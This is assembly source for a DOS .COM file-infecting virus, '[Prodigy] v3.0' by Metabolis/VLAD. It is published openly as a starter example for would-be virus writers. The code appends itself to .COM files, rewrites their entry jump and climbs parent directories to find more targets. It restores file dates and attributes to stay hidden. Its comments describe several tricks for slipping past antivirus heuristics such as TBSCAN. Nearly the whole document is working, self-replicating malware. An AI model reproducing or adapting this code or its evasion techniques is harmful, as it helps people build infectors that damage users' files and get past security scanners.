; - [Prodigy] v3.0
;   Metabolis/VLAD
;                                _   _  .---------.
;                               | | |_| |  T H E  |
;                               | |  _  `---------'
;    _____   _____   _____   ___| | | |  ______  _   _
;   |  _  | | .-. | |  _  | |  _  | | | |  ___/ | | | |
;   | |_| | | `-' | | |_| | | |_| | | | | |___  | | | |
;   |  ___| |_|~\_\ |_____| |_____| |_|  \_,. | |_|_|_|
;   | |     .---------------------.         | |   | |
;   | |     |  -  VIRUS! v3.0  -  |         | |   | |
;   |_|     `---------------------'         |_|   |_|
;
; - Direct Action, Parasitic .COM infector
; - Restores original attributes and file date/time
; - Searches '..' until there are no more files to infect
; - Won't infect COMMAND.COM
; - Has an infection counter (set to infect 2 at a time right now)
;
; - sure, this virus is simple, and not really worth releasing.. but
;   not everyone is up to understanding Qark's level of code,
;   certainly not me.  So for the people who are just starting off
;   take a look at this one.  It's the 3rd virus I've written, the
;   other 2 definately not worth publishing :) hehe
;
; - Use a86 to compile

        org     0100h                           ; yer COM file starts
                                                ; at this mem address

        db 0e9h,00h,00h                         ; jump to begin

begin:
        call    $+3                             ; get the delta offset
next:   int     3h                              ; (overcomes 'E' heuristic)
        pop     bp                              ; for the virus and
        sub     bp, offset next                 ; stick it in BP

set_dta:

        lea     si, [bp+offset first3]
        mov     di, 100h
        movsw
        movsb

        ; the virus puts the original three bytes of the program back
        ; at 100h so all we have to do at the end of the virus is jump
        ; to 100h and it will execute the infected program as normal

        mov     byte ptr [bp+counter], 00h      ; initialise infection
                                                ; counter
        mov     ah,47h                          ; get current directory
        xor     dl,dl                           ; and put it in currdir
        lea     si,[bp+offset currdir]          ; (dl=0 <- default drive)
        int     21h

        mov     ah,1Ah                          ; Set DTA to buffer
        lea     dx,[bp+offset tempDTA]          ; so command line params
        int     21h                             ; aren't overwritten

find_first:

        mov     ah,4eh                          ; find first file
        mov     cx,7                            ; with any attributes
        dec     byte ptr [bp+offset mask]

        ; the reason I dec the '+' in the filemask is because this
        ; makes it an asterisk.  This will get past scanners picking
        ; up *.COM as a heuristic.

        lea     dx,[bp+offset mask]             ; look for *.COM
        int     21h
        inc     byte ptr [bp+offset mask]

        ; this restores the '*' in the filemask to '+' for writing
        ; back to disk.

        jnc     open_file                       ; no files to infect..
        jmp     load_com

fn:
        jmp     find_next

        ; find_next is too far from most places so I've set this up to
        ; make life easier :) it gets around the jump > 128 error.

open_file:

        ; when a file is found with either find first or find next
        ; all of its details like size, attributes, name etc are stored
        ; in an area called DTA which resides at 80h (just before the
        ; COM itself at 100h).  In this case, the DTA has been moved
        ; to another address.  The different details are positioned
        ; at various positions from 80h.  9eh for instance is the
        ; position of the filename (ASCIIZ)

        cmp     word ptr [bp+tempDTA+1eh],'OC'  ; don't infect command.com
        je      fn                              ; uh oh.. find another file
        lea     dx,[bp+tempDTA+1eh]             ; filename in DTA
        mov     ax,4301h                        ; put normal attributes
        mov     cx,20h                          ; on the file
        int     21h
        jc      fn                              ; error, we outta here
        mov     ax,3D02h                        ; open that file!
        lea     dx,[bp+tempDTA+1eh]             ; filename in DTA
        int     21h
        jc      fn                              ; can't open file :(
        xchg    bx,ax                           ; put file handle in BX

infect:
        mov     cx,3                            ; read 3 bytes from file
        mov     ah,03Fh                         ; and stick them in first3
        lea     dx,[bp+offset first3]
        int     021h

        lea     cx,word ptr [bp+offset first3]  ; put the first 2 bytes of
                                                ; the file in cx
        add     cl,ch                           ; add the two bytes together
        cmp     cl,167                          ; M+Z=167 ?
        je      fn

        ; if I simply compared the first two bytes to 'MZ' (or 'ZM' since
        ; it would be a word) this would set off a tbscan heuristic, so
        ; I've used the adding method, although N+Y=167 it is not really
        ; worth worrying about, I have seen the first two bytes of a COM
        ; file equal 167 yet.

        call    lseek_end                       ; move to the end of the file

        sub     ax,heap-begin+3                 ; subtract the virus length
        cmp     word ptr [bp+first3+1],ax       ; see if jump is to virus
        je      fn                              ; file already infected
        add     ax,heap-begin                   ; add on to know where to
        mov     word ptr [bp+infjump+1],ax      ; jump to and fix it up

        mov     ax,4200h                        ; lseek to beginning of file
        cwd                                     ; xor dx,dx
        xor     cx,cx
        int     21h

        mov     cx,3                            ; write 3 bytes to file
        mov     ah,40h                          ; (the new jump to the
        lea     dx,[bp+offset infjump]          ; virus)
        int     21h

        call    lseek_end                       ; move to the end of the file

        mov     cx,heap-begin                   ; write the virus
        mov     ah,40h                          ; to the end of the
        lea     dx,[bp+offset begin]            ; file
        int     21h

        call    close_file

load_com:

        inc     byte ptr [bp+counter]           ; add one to the counter
        cmp     byte ptr [bp+counter],2         ; check if X files have
        jne     find_next                       ; been infected

        mov     ah, 1Ah                         ; restore DTA to original
        mov     dx, 80h                         ; position
        int     21h

        mov     ah,3bh                          ; Change directory
        lea     dx,[bp+offset slash]            ; to the way it was
        int     21h                             ; before the dot dot

        mov     bx,101h                         ; we need to jump to 100h
        dec     bx                              ; this will knock out a
        jmp     bx                              ; tbscan heuristic :)

find_next:

        call    close_file                      ; make sure file is closed

        mov     ah,4fh                          ; find next file
        int     21h
        jc      dot_dot
        jmp     open_file                       ; infect the bastard!

dot_dot:

        mov     ah,3bh                          ; change directory
        lea     dx,[bp+offset dds]              ; to '..' from the
        int     21h                             ; current directory
        jc      load_com
        jmp     find_first

close_file:

        xor     cx,cx
        mov     cl,byte ptr [bp+tempdta+15h]    ; get old attr from DTA
        lea     dx,[bp+TempDTA+1eh]             ; position of filename in DTA
        mov     ax,4301h                        ; set attr to original
        int     21h
        mov     cx,word ptr [bp+tempDTA+16h]    ; date and time
        mov     dx,word ptr [bp+tempDTA+18h]    ; date and time
        mov     ax,5701h                        ; set file date/time
        int     21h
        mov     ah,3eh                          ; close file
        int     21h
        ret

lseek_end:
        mov     ax,4202h                        ; get to the end
        cwd                                     ; of the file (xor dx,dx)
        xor     cx,cx
        int     21h
        ret

quote   db      0dh,0ah
        db      '[Prodigy] v3.0 by Metabolis/VLAD',0dh,0ah
        db      '"Feel the jungle vibe baby"',0dh,0ah
        db      '"In the jungle, In the jungle.."',0dh,0ah

        ; [Prodigy] v3.0 by Metabolis/VLAD
        ; "Feel the jungle vibe baby"
        ; "In the jungle, In the jungle.."

        ; Quote from "Ruff in the jungle bizness" by the Prodigy :)

infjump db      0e9h,00h,00h                    ; jump to the virus
first3  db      0cdh,20h,00h                    ; First 3 bytes of the
                                                ; com file that was infected
dds     db      '..',00                         ; '..' for dir recursor
mask    db      '+','.COM',00                   ; filemask (for finding files)
slash   db      '\'                             ; fix for currdir

        ; when you use the get current directory function it doesn't
        ; put a '\' at the beginning of it, so it's not possible to
        ; change to the directory if you store it straight away,
        ; that's why I change to directory from offset slash rather
        ; than currdir since it's ASCIIZ.. (string ending in a zero)

heap:

currdir db      64 dup (?)                      ; storage for default dir
counter db      00                              ; infection counter
tempdta db      43 dup (?)

        ; everything after heap doesn't actually get written to disk when
        ; the virus infects a file.

